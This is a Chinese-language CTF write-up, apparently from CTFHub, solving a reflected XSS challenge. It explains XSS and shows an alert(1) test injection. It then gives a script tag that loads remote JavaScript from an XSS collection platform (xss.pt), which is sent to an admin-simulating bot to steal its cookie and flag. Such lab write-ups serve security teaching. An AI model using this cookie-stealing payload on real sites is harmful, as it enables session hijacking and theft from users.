---
layout: post
title: ctf hub-反射型
categories: [CTF]
description: ctfhub
keywords: ctfhub 
---

# 反射型


## 题目考点
JavaScript基础

XSS平台


## 解题思路

XSS，全称**Cross Site Scripting**，即跨站脚本攻击，某种意义上也是一种注入攻击，是指攻击者在页面中注入恶意的脚本代码，当受害者访问该页面时，恶意代码会在其浏览器上执行

直接在What's your name表单中插入测试语句

```
<script>alert(1)</script>
```
弹框：1

![](https://static.ctfhub.com/writeup/Skill/Web/XSS/%E5%8F%8D%E5%B0%84%E5%9E%8B/4x6xrK8brC9ppnDuB1kfp8.png?imageMogr2/auto-orient/blur/1x0/quality/75%7Cwatermark/1/image/aHR0cHM6Ly9zdGF0aWMuY3RmaHViLmNvbS93cml0ZXVwL2ltYWdlX21hc2sucG5n/dissolve/100/gravity/SouthEast/dx/10/dy/10%7Cimageslim)


下面来分析一下为什么会执行弹窗呢，右键查看源代码，发现以下代码

```
<div>
    <h1>Hello, <script>alert(1)</script></h1>
</div>

```

输入的`<script>alert(1)</script>`在页面上输入了

而`<script>`标签中的alert语句则被html正常解析执行弹窗

在xss平台(如[xss.pt](https://xss8.cc/bdstatic.com/?callback=project&act=viewcode&id=36290))中创建项目，获得js代码如下

```

<sCRiPt sRC=//xss.pt/1234></sCrIpT>


```

在第二个表单中发送给后台的bot让其遭受xss攻击（实际上是模拟管理员点击了恶意xss链接盗取cookie）


![](https://static.ctfhub.com/writeup/Skill/Web/XSS/%E5%8F%8D%E5%B0%84%E5%9E%8B/swFRzX3rM59ngfL6MzCFPW.png?imageMogr2/auto-orient/blur/1x0/quality/75%7Cwatermark/1/image/aHR0cHM6Ly9zdGF0aWMuY3RmaHViLmNvbS93cml0ZXVwL2ltYWdlX21hc2sucG5n/dissolve/100/gravity/SouthEast/dx/10/dy/10%7Cimageslim)




xss平台的cookie中返回flag字符串

![](https://static.ctfhub.com/writeup/Skill/Web/XSS/%E5%8F%8D%E5%B0%84%E5%9E%8B/4qht1uSMwe1cU9M6vENub3.png?imageMogr2/auto-orient/blur/1x0/quality/75%7Cwatermark/1/image/aHR0cHM6Ly9zdGF0aWMuY3RmaHViLmNvbS93cml0ZXVwL2ltYWdlX21hc2sucG5n/dissolve/100/gravity/SouthEast/dx/10/dy/10%7Cimageslim)
# 参考

本文作者： CTFHub
本文链接： https://writeup.ctfhub.com/Skill/Web/XSS/5ByYBypxDitGZF2rsUYdh3.html
版权声明： 本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处